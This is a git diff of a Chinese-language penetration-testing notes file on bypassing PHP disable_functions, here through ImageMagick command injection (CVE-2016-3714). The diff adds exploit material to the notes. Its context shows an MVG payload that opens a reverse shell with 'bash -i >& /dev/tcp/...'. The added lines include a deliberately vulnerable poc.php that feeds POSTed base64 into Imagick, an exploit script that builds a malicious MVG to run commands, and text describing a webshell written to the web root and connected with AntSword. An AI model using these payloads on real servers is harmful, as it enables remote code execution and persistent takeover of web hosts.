@@ -24,6 +24,10 @@ $stroutput = $stdout->ReadAll();
 echo $stroutput;
 ?>
 ```
+`?a=command`
+![](img/10.png)
+
+
 
 **常规绕过**
 
@@ -206,9 +210,16 @@ pop graphic-context
 
 如果看到 `ls -al 命令成功执行`，则存在漏洞。
 
+![](img/5.png)
+
+
+
 **远程命令执行测试和使用POC**
 
 远程命令执行无回显，可通过写文件或者`反弹 shell` 来验证漏洞存在。
+
+目标图片：
+![](img/6.png)
 
 - 写一句话到网站根目录下：
     ```bash
@@ -225,9 +236,72 @@ pop graphic-context
     fill 'url(https://example.com/1.jpg"|bash -i >& /dev/tcp/192.168.1.101/2333 0>&1")'
     pop graphic-context
     ```
-将上述两个 `Exp` 经过 `base64 编码`后发送到远程 poc.php，querystring 的 key 为 img。
+将上述两个 `Exp` 经过 `base64 编码`后发送到远程 `poc.php`，querystring 的 key 为 img。
 
+![](img/7.png)
 
+发送后发现命令执行成功，生成了对应的shell.php
+
+![](img/8.png)
+
+使用蚁剑连接：
+![](img/9.png)
+
+**poc.php内容**
+
+```php
+<?php
+function readImageBlob() {
+    $base64 = "iVBORw0KGgoAAAANSUhEUgAAAM0AAAD
+ NCAMAAAAsYgRbAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5c
+ cllPAAAABJQTFRF3NSmzMewPxIG//ncJEJsldTou1jHgAAAARBJREFUeNrs2EEK
+ gCAQBVDLuv+V20dENbMY831wKz4Y/VHb/5RGQ0NDQ0NDQ0NDQ0NDQ0NDQ
+ 0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0PzMWtyaGhoaGhoaGhoaGhoaGhoxtb0QGho
+ aGhoaGhoaGhoaGhoaMbRLEvv50VTQ9OTQ5OpyZ01GpM2g0bfmDQaL7S+ofFC6x
+ v3ZpxJiywakzbvd9r3RWPS9I2+MWk0+kbf0Hih9Y17U0nTHibrDDQ0NDQ0NDQ0
+ NDQ0NDQ0NTXbRSL/AK72o6GhoaGhoRlL8951vwsNDQ0NDQ1NDc0WyHtDTEhD
+ Q0NDQ0NTS5MdGhoaGhoaGhoaGhoaGhoaGhoaGhoaGposzSHAAErMwwQ2HwRQ
+ AAAAAElFTkSuQmCC";
+    if(isset($_POST['img'])){
+        $base64 = $_POST['img'];
+    }
+    $imageBlob = base64_decode($base64);
+
+    $imagick = new Imagick();
+    $imagick->readImageBlob($imageBlob);
+
+    header("Content-Type: image/png");
+    echo $imageBlob;
+}
+```
+集成的 ImageMagick 命令执行漏洞（CVE-2016–3714）
+
+```php
+<?php
+echo "Disable Functions: " . ini_get('disable_functions') . "n";
+
+function AAAA(){
+$command = 'curl 127.0.0.1:7777'; # 命令
+
+$exploit = <<<EOF
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|$command")'
+pop graphic-context
+EOF;
+
+file_put_contents("KKKK.mvg", $exploit);
+$thumb = new Imagick();
+$thumb->readImage('KKKK.mvg');
+$thumb->writeImage('KKKK.png');
+$thumb->clear();
+$thumb->destroy();
+unlink("KKKK.mvg");
+unlink("KKKK.png");
+}
+AAAA();
+?>
+```
 
 
 **攻击 php-fpm/FastCGI bypass disable_functions 绕过**
